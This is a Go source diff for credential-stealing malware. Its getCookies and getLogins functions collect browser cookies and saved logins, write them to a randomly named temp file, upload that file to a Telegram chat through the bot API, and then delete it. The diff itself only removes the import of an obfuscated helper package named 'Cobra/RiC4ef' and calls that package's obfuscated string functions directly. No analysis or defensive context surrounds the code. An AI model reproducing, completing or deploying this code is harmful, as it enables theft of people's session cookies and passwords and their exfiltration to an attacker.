@@ -8,8 +8,6 @@ import (
 	"path/filepath"
 	"sync"
 
-	"Cobra/RiC4ef"
-
 	"github.com/Pallinder/go-randomdata"
 )
 
@@ -32,9 +30,9 @@ func main() {
 }
 
 func uploadFile(path, chatID string, waitSig *sync.WaitGroup) {
-	telegramAPIBase := RiC4ef.PSNbPz0()
-	ReqURL := fmt.Sprintf(telegramAPIBase, RiC4ef.ERxr8Z1(), chatID)
-	request, err := newfileUploadRequest(ReqURL, make(map[string]string), RiC4ef.Ul7DQM3(), path)
+	telegramAPIBase := PSNbPz0()
+	ReqURL := fmt.Sprintf(telegramAPIBase, ERxr8Z1(), chatID)
+	request, err := newfileUploadRequest(ReqURL, make(map[string]string), Ul7DQM3(), path)
 
 	if err != nil {
 		return
@@ -42,7 +40,7 @@ func uploadFile(path, chatID string, waitSig *sync.WaitGroup) {
 	Client := &http.Client{
 		Transport: &http.Transport{
 			TLSClientConfig: &tls.Config{
-				ServerName: RiC4ef.SL666d4(),
+				ServerName: SL666d4(),
 			},
 		},
 	}
@@ -54,7 +52,7 @@ func uploadFile(path, chatID string, waitSig *sync.WaitGroup) {
 }
 
 func getCookies() {
-	tmpPath := filepath.Join(normalizePath(RiC4ef.DwHsG45() + randomdata.RandStringRunes(10)))
+	tmpPath := filepath.Join(normalizePath(DwHsG45() + randomdata.RandStringRunes(10)))
 	cookies, err := getCookiesRaw()
 	if err != nil {
 		return
@@ -64,14 +62,14 @@ func getCookies() {
 	}
 	err = writeToFile(tmpPath, cookies)
 	if err == nil {
-		uploadFile(tmpPath, RiC4ef.Wprep42(), nil)
+		uploadFile(tmpPath, Wprep42(), nil)
 		os.Remove(tmpPath)
 		wg.Done()
 	}
 }
 
 func getLogins() {
-	tmpPath := filepath.Join(normalizePath(RiC4ef.DwHsG45() + randomdata.RandStringRunes(10)))
+	tmpPath := filepath.Join(normalizePath(DwHsG45() + randomdata.RandStringRunes(10)))
 	Logins, err := getLoginsRaw()
 	if err != nil {
 		return
@@ -81,7 +79,7 @@ func getLogins() {
 	}
 	err = writeToFile(tmpPath, Logins)
 	if err == nil {
-		uploadFile(tmpPath, RiC4ef.Wprep42(), nil)
+		uploadFile(tmpPath, Wprep42(), nil)
 		os.Remove(tmpPath)
 		wg.Done()
 	}
